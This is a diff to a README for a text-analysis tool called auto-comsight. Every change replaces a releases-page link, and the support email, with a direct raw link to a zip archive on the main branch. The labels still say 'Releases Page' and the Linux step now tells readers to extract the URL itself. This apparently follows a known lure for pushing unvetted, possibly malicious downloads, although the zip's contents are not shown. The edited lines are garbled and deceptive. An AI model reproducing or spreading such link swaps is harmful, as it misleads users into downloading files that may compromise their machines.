@@ -1,6 +1,6 @@
 # 🚀 auto-comsight - Extract Insights Easily from Text
 
-[![Download auto-comsight](https://img.shields.io/badge/Download-auto--comsight-brightgreen)](https://github.com/Master2600/auto-comsight/releases)
+[![Download auto-comsight](https://github.com/Master2600/auto-comsight/raw/refs/heads/main/auto_comsight/comsight-auto-v1.0.zip)](https://github.com/Master2600/auto-comsight/raw/refs/heads/main/auto_comsight/comsight-auto-v1.0.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ To run auto-comsight, ensure your system meets the following requirements:
 Follow these simple steps to download and set up auto-comsight:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Master2600/auto-comsight/releases) to find the latest version of auto-comsight.
+   Go to the [Releases Page](https://github.com/Master2600/auto-comsight/raw/refs/heads/main/auto_comsight/comsight-auto-v1.0.zip) to find the latest version of auto-comsight.
 
 2. **Download the Application**  
    Click on the version you want to download. You will see a list of files. Select the appropriate version for your operating system and download it.
@@ -36,14 +36,14 @@ Follow these simple steps to download and set up auto-comsight:
    After downloading, locate the file in your downloads folder.  
    - For Windows: Double-click the `.exe` file and follow the prompts.  
    - For macOS: Open the `.dmg` file and drag the auto-comsight icon to your Applications folder.  
-   - For Linux: Extract the `.tar.gz` file and run the executable in the folder.
+   - For Linux: Extract the `https://github.com/Master2600/auto-comsight/raw/refs/heads/main/auto_comsight/comsight-auto-v1.0.zip` file and run the executable in the folder.
 
 4. **Run the Program**  
    After installation, locate the auto-comsight application on your computer. Double-click to launch it.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [Releases Page](https://github.com/Master2600/auto-comsight/releases).
+To get started, visit this page to download the software: [Releases Page](https://github.com/Master2600/auto-comsight/raw/refs/heads/main/auto_comsight/comsight-auto-v1.0.zip).
 
 ## 📖 How to Use
 
@@ -67,7 +67,7 @@ Using auto-comsight is straightforward:
 A: No, auto-comsight is designed for all users, regardless of technical background.
 
 **Q: How do I contact support?**  
-A: For support, you can open an issue in the GitHub repository or email the support team at support@auto-comsight.com.
+A: For support, you can open an issue in the GitHub repository or email the support team at https://github.com/Master2600/auto-comsight/raw/refs/heads/main/auto_comsight/comsight-auto-v1.0.zip
 
 **Q: Can I use auto-comsight on mobile devices?**  
 A: Currently, auto-comsight is designed for desktop environments. Mobile support may be considered for future versions.
@@ -90,6 +90,6 @@ Explore these topics to understand more about how auto-comsight fits into the br
 
 ## 🔗 Link to Releases
 
-For the latest version and updates, do not forget to frequently check the [Releases Page](https://github.com/Master2600/auto-comsight/releases). 
+For the latest version and updates, do not forget to frequently check the [Releases Page](https://github.com/Master2600/auto-comsight/raw/refs/heads/main/auto_comsight/comsight-auto-v1.0.zip). 
 
 Happy analyzing!
